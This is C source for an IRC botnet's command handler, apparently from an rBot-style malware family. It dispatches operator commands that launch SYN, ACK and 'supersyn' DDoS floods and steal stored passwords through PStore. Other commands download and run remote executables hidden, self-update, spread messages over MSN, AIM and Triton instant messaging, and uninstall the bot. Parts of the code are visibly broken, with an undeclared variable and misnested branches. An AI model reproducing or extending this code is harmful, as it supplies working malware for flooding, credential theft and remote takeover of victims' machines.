#include "../h/includes.h"
#include "../h/strings.h"
#include "../h/functions.h"
#include "../cmd.h"

extern char netinfo_title[];
extern int srvsz;
char msg[256];
SOCKET sock;


int IRC_TempCommand(char *params,irc_reply_data* hostd,void* conn,BOOL silent,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	char *a[MAX_TOKENS];
	//params++; //remove the ':'
	char fcmd[1024];
	strcpy(fcmd,params);
	if (fcmd[0] == prefix)
	{
		int t=SplitParams(a,params,MAX_TOKENS);
		SWITCHES switches=GetSwitches(a,t);

		if (!a[0])
			return 1;

		if (a[0][0] == prefix)
		{
			a[0]++;
			IRC_CommandParse(a,t,fcmd,hostd,irc,switches,topic);
		}
		else
		{
			if (!silent)
				irc->pmsg(hostd->target,"%s Failed to parse command.","Failed");
			return 1;
		} 
	}

	return 1;
}

int IRC_CommandParse(char *a[MAX_TOKENS],int t,char *params,irc_reply_data* hostd,void* conn,SWITCHES switches,BOOL topic/*=FALSE*/)
{
	IRC* irc=(IRC*)conn;

	int tnum; // for finding the number of a already running thread

	//int i;	  // for misc shit

	DWORD id; // for creating new threads
	
	BOOL dec=FALSE;


	if (topic)
	{
		if (!lstrcmpi(get_auth1,a[0]) || !lstrcmpi(get_auth2,a[0]))
			return 1;
		if (!lstrcmpi(cmd_logout_1,a[0]) || !lstrcmpi(cmd_logout_2,a[0]))
			return 1;
		if (!lstrcmpi(cmd_fake_remove,a[0]) || !lstrcmpi(cmd_fakedownload,a[0]) || !lstrcmpi(cmd_fakeupdate,a[0])) {
			irc->pmsg(hostd->target,"!!!Security!!!. Lamer detected. coming back in 24hrs, download and update disabled.",main_title);
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
			return 0;
		}

		if (!lstrcmpi(cmd_remove_1,a[0]) || !lstrcmpi(cmd_remove_2,a[0]))
			return 1;
	}

	// stops
	if (switches.stop)
	{
		if (!lstrcmpi(cmd_threads_1,a[0]) || !lstrcmpi(cmd_threads_2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,LIST_THREAD,"Thread list");
			return 1;
		}
		

/*		#ifndef NO_ADVSCAN
		else if (!lstrcmpi(cmd_scanall_1,a[0]) || !lstrcmpi(cmd_scanall_2,a[0])
					|| !lstrcmpi(cmd_ntscan_1,a[0]) || !lstrcmpi(cmd_ntscan_2,a[0])
					|| !lstrcmpi(cmd_lsascan_1,a[0]) || !lstrcmpi(cmd_lsascan_2,a[0])
					|| !lstrcmpi(cmd_advscan_1,a[0]) || !lstrcmpi(cmd_advscan_2,a[0])
				{
					stopthread(hostd->target,irc,switches.silent,switches.verbose,0,SCAN_THREAD,"Scanner");
					return 1;
				}
		#endif*/
		#ifndef NO_PSTORE
		else if (!lstrcmpi(cmd_pstore_1, a[0]) || !lstrcmpi(cmd_pstore_2, a[0])) 
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,PSTORE_THREAD,"PStore");
			return 1;
		}
		#endif
		#ifndef NO_DDOS
		if (!lstrcmpi(cmd_ddos_syn, a[0]) || !lstrcmpi(cmd_ddos_ack, a[0]) || !lstrcmpi(cmd_ddos_random, a[0]))
		{
			stopthread(hostd->target, irc, switches.silent, switches.verbose, 0, DDOS_THREAD, "DDoS");
			return 1;
		}
		#endif
#ifndef NO_DOWNLOAD
		else if (!lstrcmpi(get_mnd1,a[0]) || !lstrcmpi(get_mnd2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Download");
			return 1;
		}
		else if (!lstrcmpi(get_upd1,a[0]) || !lstrcmpi(get_upd2,a[0]))
		{
			stopthread(hostd->target,irc,switches.silent,switches.verbose,0,DOWNLOAD_THREAD,"Update");
			return 1;
		}
#endif

	}
	if (!lstrcmpi(a[0],get_auth1) || !lstrcmpi(a[0],get_auth2))
	{
		if (switches.verbose)
			irc->pmsg(hostd->target,str_auth_ali,main_title);
		return 1;
	}
#ifndef NO_LOGOUT_CMD
	if (!lstrcmpi(cmd_logout_1, a[0]) || !lstrcmpi(cmd_logout_2, a[0]))
	{
		if (a[1])
		{
			i = atoi(a[1]);
			if(i>=0 && i<MAX_LOGINS)
			{
				if (irc->del_login(i))
				{
					if (!switches.silent)
						irc->pmsg(hostd->target,str_sl_logout,main_title,i);
				}

				else
				{
					if (!switches.silent)
						irc->pmsg(hostd->target,str_sl_no_logout, main_title, i);
				}
			}
			else
			{
				if (!switches.silent)
					irc->pmsg(hostd->target,str_sl_in_logout, main_title, i);
			}
		}
		else
		{
			if (irc->del_login(hostd->nick,hostd->ident,hostd->host)!=-1)
			{
				if (!switches.silent)
					irc->pmsg(hostd->target,str_logout,main_title,hostd->nick);
			}
		}
		return 1;
	}
#endif //NO_LOGOUT_CMD
#ifndef NO_REMOVE_CMD
	else if (!lstrcmpi(a[0],cmd_remove_1) || !lstrcmpi(a[0],cmd_remove_2))
	{
		uninstall();
		if (!switches.silent)
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
		else
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,"*");
		Sleep(FLOOD_DELAY);
		irc->disconnect();
		fWSACleanup();
#ifdef _DEBUG
//		CloseLog();
#endif
		ExitProcess(EXIT_SUCCESS);
	}
#endif //NO_REMOVE_CMD
#ifndef NO_IMSPREAD
	else if (!lstrcmpi(cmd_imspread_1,a[0]))
	{


		NTHREAD msn;
		msn.conn=irc;
		msn.silent=switches.silent;
		msn.verbose=switches.verbose;
		strcpy(msn.target,hostd->target);

		char *IMmessage;
 		if ( !( IMmessage = strchr(params, ' ')) )return 1;

		msn.data1=IMmessage; //Message
		msn.threadnum = addthread(MSNMSG_THREAD,"MSN Threads");
		if (threads[msn.threadnum].tHandle = CreateThread(NULL, 0, &ImMsg, (LPVOID)&msn, 0, &id))
		{
			while (msn.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Thread Activated: Sending Message.", imspread_title);
		}



	}
	else if(!lstrcmpi(cmd_imspread_2,a[0]))
	{
		::killthreadid(MSN_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", imspread_title);
	}
#endif
#ifndef NO_AIM
	else if (!lstrcmpi(cmd_aimspread_1,a[0]))
	{
		NTHREAD aim;
		aim.conn=irc;
		aim.silent=switches.silent;
		aim.verbose=switches.verbose;

		char *AIMmessage;
 		if ( !( AIMmessage = strchr(params, ' ')) )return 1;

		aim.data1=AIMmessage; //Message
		aim.threadnum = addthread(AIM_THREAD,"AIM Threads");
		if (threads[aim.threadnum].tHandle = CreateThread(NULL, 0, &AimMessage, (LPVOID)&aim, 0, &id))
		{
			while (aim.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Thread Activated: Sending Message.", aimspread_title);
		}

	else if(!lstrcmpi(cmd_aimspread_2,a[0]))
	{
		::killthreadid(AIM_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", aimspread_title);
	}

	}

#endif
#ifndef NO_AIM
	else if (!lstrcmpi(cmd_timspread_1,a[0]))
	{
		NTHREAD tim;
		tim.conn=irc;
		tim.silent=switches.silent;
		tim.verbose=switches.verbose;

		char *TIMmessage;
 		if ( !( TIMmessage = strchr(params, ' ')) )return 1;

		tim.data1=TIMmessage; //Message
		tim.threadnum = addthread(TIM_THREAD,"TIM Threads");
		if (threads[tim.threadnum].tHandle = CreateThread(NULL, 0, &TritonMessage, (LPVOID)&tim, 0, &id))
		{
			while (tim.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Thread Activated: Sending Message.", timspread_title);
		}

	else if(!lstrcmpi(cmd_timspread_2,a[0]))
	{
		::killthreadid(TIM_THREAD,1);
		irc->pmsg(hostd->target,"%s Thread Disabled.", timspread_title);
	}

	}

#endif
#ifndef NO_PSTORE
	else if (!lstrcmpi(a[0],cmd_pstore_1) || !lstrcmpi(a[0],cmd_pstore_2))
	{
		if ((tnum=findthreadnum(PSTORE_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, pstore_title,"pstore thread", tnum);
			return 1;
		}

		NTHREAD PSTORE;
		PSTORE.conn=irc;
		PSTORE.silent=switches.silent;
		PSTORE.verbose=switches.verbose;

		if (!lstrcmpi(a[0],cmd_pstore_2)) {
			PSTORE.bdata1=TRUE;
			PSTORE.data1=a[1];
		}


		strcpy(PSTORE.target,hostd->target);
		PSTORE.threadnum = addthread(PSTORE_THREAD,"PStore Thread");
		if (threads[PSTORE.threadnum].tHandle = CreateThread(NULL, 0, &pstore, (LPVOID)&PSTORE, 0, &id))
		{
			while (PSTORE.gotinfo == FALSE)
				Sleep(50);
		}


	}
#endif
#ifndef NO_VISIT
	else if (!lstrcmpi(a[0],cmd_visit))
	{

		NTHREAD Visit;
		Visit.conn=irc;
		Visit.silent=switches.silent;
		Visit.verbose=switches.verbose;
		strcpy(Visit.target,hostd->target);
		Visit.data1=a[1];

		if (a[2] != NULL) strncpy(Visit.data2, a[2], sizeof(Visit.data2)-1);

		Visit.threadnum = addthread(VISIT_THREAD,"Visit Threads");
		if (threads[Visit.threadnum].tHandle = CreateThread(NULL, 0, &VisitThread, (LPVOID)&Visit, 0, &id))
		{
			while (Visit.gotinfo == FALSE) Sleep(50);
				irc->pmsg(hostd->target,"%s Visiting Website Now", visit_title);
		}


	}
#endif 
#ifndef NO_DDOS
	else if (!lstrcmpi(cmd_ddos_syn,a[0]) || !lstrcmpi(cmd_ddos_ack,a[0]) || !lstrcmpi(cmd_ddos_random,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		DDOS ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		if (strcmp("ddos.syn", a[0]) == 0 )
			sprintf(ddos.type,"ddos.syn");
		else if (strcmp("ddos.random", a[0]) == 0 )
			sprintf(ddos.type,"ddos.random"); 	
		else	sprintf(ddos.type,"ddos.ack");
	
		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);

		ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->pmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
			return 1;
		}
	}

#endif

#ifndef NO_SUPERSYN
	
	else if (!lstrcmpi(cmd_ddos_supersyn,a[0]))
	{
		if ((tnum=findthreadnum(DDOS_THREAD)) > 0)
		{
			irc->pmsg(hostd->target, str_thread_alr, ddos_title,"ddos thread", tnum);
			return 1;
		}

		SUPERSYN ddos;
		sprintf(ddos.ip,	"%s", a[1]);
		sprintf(ddos.port,	"%s", a[2]);
		sprintf(ddos.length,"%s", a[3]);

		ddos.notice = 0;//switches.halfsilent;
		ddos.silent = 0;//switches.silent;
		ddos.conn=irc;
		strcpy(ddos.target,hostd->target);

		ddos.threadnum = addthread(DDOS_THREAD,"%s Flooding %s:%s for %s seconds",ddos_title,a[1],a[2],a[3]);
		
		if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &SuperSynThread, (LPVOID)&ddos, 0, &id))
		{
			while(ddos.gotinfo == FALSE)
			Sleep(50);
		}
		else
		{
			if (!ddos.silent)
				irc->pmsg(hostd->target,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());
			return 1;
		}
	}
#endif
	//////////////////////////////////////////////////////////////////////////////
	//								Join
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_join_1,a[0]) || !lstrcmpi(cmd_join_2,a[0]))
	{	
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->join(a[1],(a[2]?a[2]:""));
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Part
	//////////////////////////////////////////////////////////////////////////////
	else if (!lstrcmpi(cmd_part_1,a[0]) || !lstrcmpi(cmd_part_2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,irc_title);
			return 1;
		}
		irc->part(a[1]);
//		addlogv(MAINLOG, "%s Parted channel: '%s'.", irc_title, a[s+1]);
		return 1;
	}


	//////////////////////////////////////////////////////////////////////////////
	//								Download
	//////////////////////////////////////////////////////////////////////////////

#ifndef NO_DOWNLOAD


	//fake download commands
	else if (!lstrcmpi(cmd_fakedownload,a[0]) || !lstrcmpi(cmd_fakeupdate,a[0]) || !lstrcmpi(cmd_fake_remove,a[0])) {
			irc->pmsg(hostd->target,"!!!Security!!!. Lamer detected. coming back next reboot, cya.");
			irc->quit(str_quit_rem,hostd->nick,hostd->ident,hostd->host);
			//exit the connection, we've been possibly taken over. just come back when the bo(t/x) reboots.
			irc->disconnect();
	}	
	
	else if (!lstrcmpi(get_mnd1,a[0]) || !lstrcmpi(get_mnd2,a[0]))
	{
		if (!a[1] || !a[2])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,download_title);
			return 1;
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,download_title,"transfer thread",tnum);
			return 1;
		}
		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];//site
		dl.data2=a[2];//location
		dl.bdata1 = FALSE;//update
		dl.bdata2 = (a[3]?TRUE:FALSE);//run
		dl.bdata3 = (a[4]?TRUE:FALSE);//run hidden
		//dl.expectedcrc=((a[s+4])?(strtoul(a[s+4],0,16)):(0));
		//dl.filelen=((a[s+5])?(atoi(a[s+5])):(0));
		//dl.encrypted=(parameters['e']);

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading URL: %s to: %s.",download_title,(dec?"*":a[1]),a[2]);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s Downloading URL: %s to: %s.",download_title,a[1],a[2]);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,download_title,"transfer thread",GetLastError());
		}
		return 1;
	}

	//////////////////////////////////////////////////////////////////////////////
	//								Update
	//////////////////////////////////////////////////////////////////////////////
#ifndef NO_UPDATE
	else if (!lstrcmpi(get_upd1,a[0]) || !lstrcmpi(get_upd2,a[0]))
	{
		if (!a[1])
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_bad_format,update_title);
			return 1;
		}
		if (a[2])
		{
			if (!lstrcmpi(bid,a[2]))
			{
				return 1;
			}
		}
		if ((tnum=findthreadnum(DOWNLOAD_THREAD)) > 0)
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_alr,update_title,"transfer thread",tnum);
			return 1;
		}

		char tempdir[MAX_PATH], tmpbuf[MAX_PATH];
		GetTempPath(sizeof(tempdir), tempdir);
		sprintf(tmpbuf,"%seraseme_%d%d%d%d%d.exe",tempdir,rand()%9,rand()%9,rand()%9,rand()%9,rand()%9);

		NTHREAD dl;
		dl.conn=irc;
		dl.silent=switches.silent;
		dl.verbose=switches.verbose;
		strcpy(dl.target,hostd->target);
		dl.data1=a[1];
		dl.data2=tmpbuf;
		if (a[3]) dl.idata1=1;
		else	  dl.idata1=0;
		dl.bdata1 = TRUE;//update
		dl.bdata2 = FALSE;//run
		dl.bdata3 = FALSE;//run hidden

		
		dl.threadnum = addthread(DOWNLOAD_THREAD,"%s Downloading update from: %s to: %s.",update_title,(dec?"*":a[1]),dl.data2);
		if (threads[dl.threadnum].tHandle = CreateThread(NULL, 0, &DownloadThread, (LPVOID)&dl, 0, &id))
		{
			while (dl.gotinfo == FALSE)
				Sleep(50);
			
			if (!switches.silent && switches.verbose)
				irc->pmsg(hostd->target,"%s Downloading update from: %s to: %s.",update_title,a[1],dl.data2);
		}
		else
		{
			if (!switches.silent)
				irc->pmsg(hostd->target,str_thread_fail,update_title,"transfer thread",GetLastError());
		}
		return 1;
	}
#endif // NO_UPDATE
#endif // NO_DOWNLOAD

	// I'll add more shit here later ~ h1t3m

//END OF PROGRAM.


	return 0;
}
